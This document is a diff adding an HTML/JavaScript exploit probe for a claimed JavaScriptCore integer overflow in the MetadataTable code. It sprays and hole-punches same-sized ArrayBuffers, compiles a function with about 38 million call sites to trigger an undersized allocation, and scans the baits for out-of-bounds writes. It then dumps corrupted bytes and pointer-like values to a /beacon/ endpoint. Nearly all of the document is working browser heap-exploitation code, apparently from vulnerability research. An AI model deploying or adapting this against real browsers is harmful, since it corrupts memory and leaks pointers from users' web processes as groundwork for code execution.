@@ -1,0 +1,219 @@
+<!--
+  p615: MetadataTable integer overflow v2 — controlled heap corruption test
+  JSC Bug 317632: UnlinkedMetadataTable::finalize() 32-bit overflow
+
+  38,348,816 op_call sites × 112 bytes = 4,295,067,392 (wraps to 100,096).
+  JSC allocates 100,096 bytes but writes ~4.3GB during execution.
+  After ~893 entries fill the buffer, subsequent entries write OOB.
+
+  Previous attempt (V480): 0/14 string corruption — wrong bait type.
+  This probe uses ArrayBuffer(100096) baits (same size class as the
+  undersized MetadataTable allocation) with hole-punching for adjacency.
+
+  CRASH_CLASS: HIGH (OOB write, WebProcess crash expected during exec)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p615</title>
+<script>
+function b(m){try{new Image().src='/beacon/'+encodeURIComponent(m);}catch(e){}}
+function toHex(arr, off, len) {
+  var s = '';
+  for (var i = 0; i < len && (off + i) < arr.length; i++)
+    s += ('0' + arr[off + i].toString(16)).slice(-2);
+  return s;
+}
+function rQ(v, o) {
+  var lo = (v[o] & 0xFF) + ((v[o+1] & 0xFF) << 8) +
+           ((v[o+2] & 0xFF) << 16) + ((v[o+3] & 0xFF) * 0x1000000);
+  var hi = (v[o+4] & 0xFF) + ((v[o+5] & 0xFF) << 8) +
+           ((v[o+6] & 0xFF) << 16) + ((v[o+7] & 0xFF) * 0x1000000);
+  var hs = ('00000000' + hi.toString(16)).slice(-8);
+  var ls = ('00000000' + lo.toString(16)).slice(-8);
+  return hs + ls;
+}
+
+(function() {
+var BAIT_SIZE = 100096;
+var BAIT_COUNT = 200;
+var SENTINEL = 0xBE;
+var OP_CALL_COUNT = 38348816;
+var baits = [];
+var views = [];
+
+function phase1_alloc() {
+  b('P615-START');
+  for (var i = 0; i < BAIT_COUNT; i++) {
+    var ab = new ArrayBuffer(BAIT_SIZE);
+    var u8 = new Uint8Array(ab);
+    for (var j = 0; j < BAIT_SIZE; j++) u8[j] = SENTINEL;
+    baits.push(ab);
+    views.push(u8);
+  }
+  b('P615-ALLOC=' + baits.length);
+  setTimeout(phase2_baseline, 0);
+}
+
+function phase2_baseline() {
+  var bad = 0;
+  for (var i = 0; i < BAIT_COUNT; i++) {
+    var v = views[i];
+    for (var j = 0; j < BAIT_SIZE; j++) {
+      if (v[j] !== SENTINEL) { bad++; break; }
+    }
+  }
+  b('P615-BASELINE=' + (bad === 0 ? 'OK' : 'FAIL-' + bad));
+  if (bad > 0) return;
+  setTimeout(phase3_holes, 0);
+}
+
+function phase3_holes() {
+  var freed = 0;
+  for (var i = 0; i < BAIT_COUNT; i += 2) {
+    baits[i] = null;
+    views[i] = null;
+    freed++;
+  }
+  var junk = [];
+  for (var i = 0; i < 200000; i++) junk.push({a: i});
+  junk = null;
+  b('P615-HOLES=' + freed);
+  setTimeout(phase4_source, 500);
+}
+
+function phase4_source() {
+  b('P615-SOURCE-BUILD');
+  var source = null;
+  try {
+    source = 'x();'.repeat(OP_CALL_COUNT);
+  } catch (e1) {
+    b('P615-REPEAT-OOM');
+    try {
+      var chunks = [];
+      var CHUNK = 100000;
+      var full = Math.floor(OP_CALL_COUNT / CHUNK);
+      var rem = OP_CALL_COUNT % CHUNK;
+      var one = 'x();'.repeat(CHUNK);
+      for (var i = 0; i < full; i++) chunks.push(one);
+      if (rem > 0) chunks.push('x();'.repeat(rem));
+      source = chunks.join('');
+      chunks = null; one = null;
+    } catch (e2) {
+      b('P615-SOURCE-FAIL=' + e2);
+      return;
+    }
+  }
+  b('P615-SOURCE-LEN=' + source.length);
+  window._p615_source = source;
+  setTimeout(phase5_compile, 100);
+}
+
+function phase5_compile() {
+  var source = window._p615_source;
+  window._p615_source = null;
+  b('P615-COMPILING');
+  var fn;
+  try {
+    fn = new Function('x', source);
+    source = null;
+  } catch (e) {
+    b('P615-COMPILE-FAIL=' + String(e).slice(0, 200));
+    return;
+  }
+  b('P615-COMPILED');
+  window._p615_fn = fn;
+  setTimeout(phase6_postcompile, 0);
+}
+
+function phase6_postcompile() {
+  var corrupted = 0;
+  for (var i = 1; i < BAIT_COUNT; i += 2) {
+    var v = views[i];
+    if (!v) continue;
+    for (var j = 0; j < BAIT_SIZE; j++) {
+      if (v[j] !== SENTINEL) { corrupted++; break; }
+    }
+  }
+  b('P615-POST-COMPILE-CORRUPTED=' + corrupted);
+  setTimeout(phase7_exec, 0);
+}
+
+function phase7_exec() {
+  var fn = window._p615_fn;
+  window._p615_fn = null;
+  var callCount = 0;
+  b('P615-EXEC-START');
+  try {
+    fn(function() {
+      callCount++;
+      if (callCount === 100) b('P615-CALLS-100');
+      if (callCount === 500) b('P615-CALLS-500');
+      if (callCount === 893) b('P615-CALLS-893-BOUNDARY');
+      if (callCount === 1000) b('P615-CALLS-1000');
+      if (callCount === 1500) {
+        b('P615-CALLS-1500-BAIL');
+        throw 'bail';
+      }
+    });
+  } catch (e) {
+    b('P615-EXEC-CATCH=' + String(e).slice(0, 100));
+  }
+  b('P615-CALLS=' + callCount);
+  setTimeout(phase8_scan, 0);
+}
+
+function phase8_scan() {
+  var corrupted = 0;
+  var details = [];
+  for (var i = 1; i < BAIT_COUNT; i += 2) {
+    var v = views[i];
+    if (!v) continue;
+    var firstBad = -1, lastBad = -1, badCount = 0;
+    for (var j = 0; j < BAIT_SIZE; j++) {
+      if (v[j] !== SENTINEL) {
+        badCount++;
+        if (firstBad < 0) firstBad = j;
+        lastBad = j;
+      }
+    }
+    if (badCount > 0) {
+      corrupted++;
+      details.push({idx: i, first: firstBad, last: lastBad, count: badCount});
+    }
+  }
+  b('P615-CORRUPTED=' + corrupted + '/100');
+  window._p615_details = details;
+  setTimeout(phase9_dump, 0);
+}
+
+function phase9_dump() {
+  var details = window._p615_details || [];
+  for (var d = 0; d < details.length && d < 5; d++) {
+    var info = details[d];
+    var v = views[info.idx];
+    var hexStart = toHex(v, info.first, 64);
+    b('P615-DUMP-b' + info.idx + '-off=' + info.first + '-n=' + info.count + '-hex=' + hexStart);
+
+    var ptrs = [];
+    var scanStart = info.first & ~7;
+    for (var off = scanStart; off <= info.last - 7 && off + 8 <= BAIT_SIZE; off += 8) {
+      var q = rQ(v, off);
+      var hi4 = q.slice(0, 4);
+      if (hi4 !== '0000' && hi4 !== 'bebe') {
+        ptrs.push(off + ':' + q);
+      }
+    }
+    if (ptrs.length > 0) {
+      var ptrStr = ptrs.slice(0, 10).join(',');
+      b('P615-PTRS-b' + info.idx + '=' + ptrStr);
+    }
+
+    if (info.count > 64) {
+      var midOff = Math.floor((info.first + info.last) / 2) & ~15;
+      b('P615-MID-b' + info.idx + '-off=' + midOff + '-hex=' + toHex(v, midOff, 64));
+    }
+  }
+  b('P615-ALIVE');
+}
+
+setTimeout(phase1_alloc, 300);
+})();
+</script></head><body>p615: MetadataTable overflow v2</body></html>
